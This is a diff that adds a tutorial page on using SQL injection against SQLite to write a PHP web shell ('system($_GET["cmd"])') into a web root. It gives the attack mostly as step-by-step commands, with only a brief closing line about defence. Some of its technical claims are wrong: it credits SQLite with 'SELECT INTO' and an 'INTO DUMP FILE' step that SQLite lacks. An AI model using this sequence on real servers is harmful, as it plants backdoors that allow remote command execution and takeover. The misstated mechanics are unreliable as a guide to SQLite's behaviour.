@@ -1,0 +1,84 @@
+---
+title: Exploiting SQLite for File Writing via SQL Injection
+description: Learn to manipulate SQLite for unauthorized file writing, enabling remote
+  code execution through SQL injection techniques.
+keywords:
+- SQLite
+- file writing
+- SQL injection
+- remote code execution
+- database security
+- ATTACH command
+- SELECT INTO
+- exploiting vulnerabilities
+---
+
+# SQLite Write File
+
+## Context
+
+This article will teach how to exploit SQLite to write files via SQL injection. It assumes knowledge in areas such as database file structure, SQL query execution, file system permissions, and general manipulation tactics within SQLite databases. This technique leverages the ability of SQLite to interact with the file system, presenting a significant risk when SQL injection vulnerabilities are present.
+
+## Theory
+
+### SQLite File Write Mechanisms
+
+SQLite allows writing to files using specific SQL commands, notably `ATTACH` and `SELECT INTO`. These commands enable direct interactions with the file system from within SQL queries, which can be exploited through vulnerabilities such as SQL injection. This capability can be manipulated to write files that may contain arbitrary instructions.
+
+SQLite can be instructed to write data into specific files, and when this is combined with the ability to execute SQL code via injection, attackers can create or modify files that lead to further system compromise.
+
+### Exploiting SQLite for File Writing
+
+The attack sequence begins with SQL injection to inject commands that attach a target database file. By creating a new table within this attached database, an attacker can hold the payload data temporarily. The payload can be any form of instructions, including scripts. For instance, an attacker can write PHP code that allows execution of commands passed via web requests.
+
+After populating the table with the malicious payload, the attacker executes an `SELECT INTO` command to dump this data into a defined file path, effectively writing their code into the server's accessible directories.
+
+### Security Implications of SQLite File Writing
+
+Unauthorized file writes pose a substantial threat, potentially leading to remote code execution or data corruption. This occurs because applications often operate under the assumption that database queries are inherently safe and do not need stringent validation, especially concerning output paths in databases like SQLite.
+
+The ability to write files can lead to persistent web shells or unauthorized modification of application files, resulting in full control over an application environment if left unchecked.
+
+## Practice
+
+### SQLite Write File via SQL Injection
+
+#### Steps
+
+- Begin by opening SQLite in memory mode to prepare for file operations:
+
+    ```bash
+    sqlite3 'file:exploit.db?mode=memory&cache=shared'
+    ```
+
+- Attach a new database file where the payload will be written:
+
+    ```bash
+    ATTACH DATABASE '/var/www/html/shell.php' AS shell;
+    ```
+
+- Create a table in the attached database to hold the payload:
+
+    ```bash
+    CREATE TABLE shell.payload(data TEXT);
+    ```
+
+- Insert the PHP code into the table to enable command execution:
+
+    ```bash
+    INSERT INTO shell.payload(data) VALUES('<?php system($_GET["cmd"]); ?>');
+    ```
+
+- Dump the table content into a PHP file on the server:
+
+    ```bash
+    SELECT data FROM shell.payload INTO DUMP FILE '/var/www/html/shell.php';
+    ```
+
+By carefully executing these commands, an attacker creates a PHP file on the server. This file enables remote code execution through crafted web requests, allowing the execution of arbitrary shell commands on the server environment.
+
+## Tools
+
+- **sqlite3**
+
+This article demonstrates the significant risk posed by SQLite's file manipulation capabilities when SQL injection vulnerabilities exist. Understanding how these operations are conducted can fortify assessments and mitigations in infrastructures reliant on SQLite databases.
